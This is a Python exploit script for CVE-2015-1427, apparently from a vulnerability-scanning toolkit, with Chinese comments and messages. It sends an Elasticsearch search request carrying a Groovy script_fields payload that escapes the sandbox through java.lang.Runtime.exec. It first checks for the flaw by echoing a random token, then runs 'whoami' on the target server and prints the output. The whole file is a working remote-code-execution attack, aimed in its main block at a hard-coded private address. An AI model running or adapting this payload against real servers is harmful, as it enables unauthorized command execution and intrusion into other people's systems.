#!/usr/bin/env python3

'''
name: CVE-2015-1427漏洞
description: CVE-2015-1427漏洞可执行任意命令
'''

import time
import json
import string
import random
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CVE_2015_1427_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.capta=''
        self.words=''.join((string.ascii_letters,string.digits))
        for i in range(6):
            self.capta = self.capta + random.choice(self.words)
        self.data_payload = {"name": "test"}
        self.check_payload = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"echo %s\").getText()" %(self.capta)}}} 
        self.cmd_payload = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"}}}

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            data_req = requests.post(self.url + '/website/blog/', data = json.dumps(self.data_payload), headers = self.headers, allow_redirects = False, verify = False)
            check_req = requests.post(self.url + '/_search?pretty', data = json.dumps(self.check_payload), headers = self.headers, allow_redirects = False, verify = False)
            if check_req.status_code == 200 and self.capta in json.loads(check_req.text)["hits"]["hits"][0]["fields"]["lupin"][0]:
                print('存在CVE-2015-1427漏洞')
                cmd_req = requests.post(self.url + '/_search?pretty', data = json.dumps(self.cmd_payload), headers = self.headers, allow_redirects = False, verify = False)
                print('执行whoami命令结果为:',json.loads(cmd_req.text)["hits"]["hits"][0]["fields"]["lupin"][0])
                return True
            else:
                print ('不存在CVE-2015-1427漏洞')
                return False
        except Exception as e:
            print(e)
            print ('不存在CVE-2015-1427漏洞')
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2015_1427 = CVE_2015_1427_BaseVerify('http://192.168.30.242:9200')
    CVE_2015_1427.run()


